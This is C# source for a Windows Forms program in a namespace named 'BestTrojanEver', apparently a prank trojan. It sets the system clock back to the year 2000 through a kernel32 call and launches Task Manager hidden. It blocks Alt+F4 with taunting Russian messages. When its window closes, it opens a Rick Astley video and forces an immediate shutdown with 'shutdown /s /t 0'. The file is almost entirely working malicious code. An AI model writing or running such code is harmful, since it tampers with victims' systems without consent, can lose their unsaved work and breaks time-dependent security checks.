using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace BestTrojanEver
{
    public partial class OtrizkaProduction : Form
    {
        public Thread processSearch;
        public Thread onClose;
        public System.Media.SoundPlayer mainSound;

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEMTIME
        {
            public short wYear;
            public short wMonth;
            public short wDayOfWeek;
            public short wDay;
            public short wHour;
            public short wMinute;
            public short wSecond;
            public short wMilliseconds;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetSystemTime([In] ref SYSTEMTIME st);




        protected override void OnKeyDown(KeyEventArgs e)
        {
            base.OnKeyDown(e);
            if (e.KeyCode == Keys.F4 && e.Alt)
            {
                MessageBox.Show("не пытайся закрыть дору <3");
                e.Handled = true;
            }
        }
        public OtrizkaProduction()
        {
            InitializeComponent();
            onClose = new Thread(() =>
            {
                mainSound.Stop();
                System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
                Thread.Sleep(20000);
                Process.Start("shutdown", "/s /t 0");
            });

            processSearch = new Thread(() =>
            {
                SYSTEMTIME st = new SYSTEMTIME();
                st.wYear = Convert.ToInt16(2000);
                st.wMonth = Convert.ToInt16(DateTime.UtcNow.Month);
                st.wDay = Convert.ToInt16(DateTime.UtcNow.Day);
                st.wHour = Convert.ToInt16(DateTime.UtcNow.Hour);
                st.wMinute = Convert.ToInt16(DateTime.UtcNow.Minute);
                st.wSecond = Convert.ToInt16(DateTime.UtcNow.Second);
                st.wMilliseconds = Convert.ToInt16(DateTime.UtcNow.Millisecond);
                SetSystemTime(ref st);

                Process flash = new Process();
                flash.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                flash.StartInfo.FileName = @"C:\Windows\System32\Taskmgr.exe";
                flash.Start();
                flash.Close();
            });
        }
        private void OtrizkaProduction_Load(object sender, EventArgs e)
        {
            mainSound = new System.Media.SoundPlayer(@"music.wav");
            mainSound.Play();
            processSearch.Start();
            MessageBox.Show("если закрыть дору,компик перезапуститься <3");
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            onClose.Start();
        }
    }
}
